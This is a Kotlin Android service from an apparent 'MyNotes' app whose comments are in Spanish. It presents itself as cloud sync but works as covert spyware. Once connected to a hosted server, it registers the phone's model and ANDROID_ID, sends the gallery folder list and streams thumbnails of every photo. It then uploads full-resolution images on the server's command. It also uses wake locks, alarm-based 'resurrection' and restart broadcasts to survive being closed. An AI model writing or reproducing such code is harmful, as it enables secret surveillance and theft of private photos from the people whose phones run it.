package cl.example.mynotes

import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.media.ThumbnailUtils
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.os.SystemClock
import android.provider.MediaStore
import android.provider.Settings
import android.util.Base64
import android.util.Log
import androidx.core.app.NotificationCompat
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File
import kotlin.concurrent.thread

class CloudSyncService : Service() {

    private var socket: Socket? = null
    // TU URL DE RENDER
    private val SERVER_URL = "https://mynotes-server-rvtf.onrender.com"
    private val CHANNEL_ID = "MyNotesBackupChannel"

    private var wakeLock: PowerManager.WakeLock? = null
    @Volatile private var isScanning = false

    override fun onCreate() {
        super.onCreate()

        // 1. PRIORIDAD ABSOLUTA A LA NOTIFICACIÓN
        // Esto evita el crash en Android 14+
        try {
            startForeground(1, createNotification())
        } catch (e: Exception) {
            e.printStackTrace()
        }

        // 2. Después iniciamos Wakelock (para CPU)
        try {
            val powerManager = getSystemService(POWER_SERVICE) as PowerManager
            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MyNotes:SyncTag")
            wakeLock?.acquire(60 * 60 * 1000L) // 1 Hora máximo
        } catch (e: Exception) {
            Log.e("CloudSyncService", "Error WL: ${e.message}")
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Refuerzo: Asegurar que la notificación esté visible
        startForeground(1, createNotification())

        connectAndListen()

        // START_STICKY: Si Android mata el servicio, intenta revivirlo
        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        Log.d("CloudSyncService", "Detectado cierre forzado (Swipe)")

        // LÓGICA DE RESURRECCIÓN PARA VIVO/XIAOMI
        val restartIntent = Intent(applicationContext, RestartReceiver::class.java).apply {
            setPackage(packageName)
        }
        val pendingIntent = PendingIntent.getBroadcast(
            applicationContext, 1, restartIntent, PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarmManager = applicationContext.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmManager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + 1000, pendingIntent)
    }

    private fun createNotification(): Notification {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(CHANNEL_ID, "Cloud Service", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("MyNotes Cloud")
            .setContentText("Sincronización activa")
            .setSmallIcon(android.R.drawable.ic_popup_sync)
            .setOngoing(true)
            .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
            .build()
    }

    private fun connectAndListen() {
        if (socket?.connected() == true) return

        try {
            val options = IO.Options().apply {
                reconnection = true
                reconnectionAttempts = Int.MAX_VALUE
                reconnectionDelay = 5000
                reconnectionDelayMax = 10000
                timeout = 60000
                forceNew = true
            }
            socket = IO.socket(SERVER_URL, options)

            socket?.on(Socket.EVENT_CONNECT) {
                Log.d("MyNotesSync", "✅ Conectado al Servidor")
                registrarDispositivo()

                // --- NUEVO: ENVIAR LISTA DE CARPETAS ---
                // Esto permite que el servidor V8 muestre el menú desplegable
                thread { sendFolderList() }

                // Si se conecta y no estaba haciendo nada, iniciamos escaneo general (sin filtro)
                // OJO: Si prefieres esperar orden, comenta estas 3 líneas:
                if (!isScanning) {
                    isScanning = true
                    thread { sendThumbnails(null) }
                }
            }

            socket?.on("command_start_scan") { args ->
                if (!isScanning) {
                    isScanning = true
                    var folderFilter: String? = null

                    // Leer si el servidor pidió una carpeta específica
                    if (args.isNotEmpty()) {
                        val params = args[0] as? JSONObject
                        val requestedFolder = params?.optString("folder")
                        if (!requestedFolder.isNullOrEmpty()) {
                            folderFilter = requestedFolder
                        }
                    }
                    thread { sendThumbnails(folderFilter) }
                }
            }

            socket?.on("command_stop_scan") { isScanning = false }

            socket?.on("request_full_image") { args ->
                val data = args[0] as JSONObject
                thread { uploadHighQuality(data.optString("path")) }
            }

            socket?.connect()
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun registrarDispositivo() {
        try {
            val info = JSONObject().apply {
                put("deviceName", "${Build.MANUFACTURER} ${Build.MODEL}")
                put("deviceId", Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID))
                put("dataType", "register_device")
            }
            socket?.emit("usrData", info)
        } catch (e: Exception) { e.printStackTrace() }
    }

    // --- NUEVO: ESCANEAR Y ENVIAR LISTA DE CARPETAS ---
    private fun sendFolderList() {
        val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        val projection = arrayOf(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)
        val uniqueFolders = HashSet<String>()

        try {
            contentResolver.query(uri, projection, null, null, null)?.use { cursor ->
                val idxBucket = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)
                while (cursor.moveToNext()) {
                    val folderName = cursor.getString(idxBucket)
                    if (!folderName.isNullOrEmpty()) {
                        uniqueFolders.add(folderName)
                    }
                }
            }

            if (uniqueFolders.isNotEmpty()) {
                val data = JSONObject().apply {
                    put("dataType", "folder_list")
                    put("folders", org.json.JSONArray(uniqueFolders))
                }
                socket?.emit("usrData", data)
                Log.d("MyNotesSync", "Carpetas enviadas: ${uniqueFolders.size}")
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    // --- LÓGICA DE ESCANEO CON FILTRO SQL ---
    private fun sendThumbnails(targetFolder: String?) {
        val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        val projection = arrayOf(MediaStore.Images.Media.DATA, MediaStore.Images.Media.DISPLAY_NAME)
        val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"

        var selection: String? = null
        var selectionArgs: Array<String>? = null

        // Si hay carpeta objetivo, filtramos por nombre de bucket
        if (targetFolder != null) {
            selection = "${MediaStore.Images.Media.BUCKET_DISPLAY_NAME} LIKE ?"
            selectionArgs = arrayOf("%$targetFolder%")
            Log.d("MyNotesSync", "Escaneando SOLO: $targetFolder")
        }

        try {
            contentResolver.query(uri, projection, selection, selectionArgs, sortOrder)?.use { cursor ->
                val idxData = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
                val idxName = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)

                while (cursor.moveToNext()) {
                    if (!isScanning || socket?.connected() != true) break

                    val path = cursor.getString(idxData)
                    val name = cursor.getString(idxName)
                    val file = File(path)
                    val folderName = file.parentFile?.name ?: "Unknown"

                    val thumb = getThumb(path)
                    if (thumb != null) {
                        val data = JSONObject().apply {
                            put("name", name)
                            put("path", path)
                            put("folder", folderName)
                            put("image64", encodeToBase64(thumb, 30))
                            put("dataType", "preview_image")
                        }
                        socket?.emit("usrData", data)
                        Thread.sleep(50)
                    }
                }
            }
        } catch (e: Exception) { Log.e("MyNotesSync", "Scan Error: ${e.message}") }
        isScanning = false
    }

    private fun uploadHighQuality(path: String) {
        try {
            val file = File(path)
            if (file.exists()) {
                val bitmap = BitmapFactory.decodeFile(path)
                if (bitmap != null) {
                    val encoded = encodeToBase64(bitmap, 100)
                    val data = JSONObject().apply {
                        put("name", "HD_${file.name}")
                        put("image64", encoded)
                        put("dataType", "full_image")
                    }
                    socket?.emit("usrData", data)
                    bitmap.recycle()
                }
            }
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun getThumb(path: String): Bitmap? = try {
        ThumbnailUtils.extractThumbnail(BitmapFactory.decodeFile(path), 96, 96)
    } catch (e: Exception) { null }

    private fun encodeToBase64(bm: Bitmap, quality: Int): String {
        val baos = ByteArrayOutputStream()
        bm.compress(Bitmap.CompressFormat.JPEG, quality, baos)
        return Base64.encodeToString(baos.toByteArray(), Base64.DEFAULT)
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        try { if (wakeLock?.isHeld == true) wakeLock?.release(); socket?.disconnect() } catch (e: Exception) {}

        // Intentar revivir inmediatamente
        sendBroadcast(Intent(this, RestartReceiver::class.java))
    }
}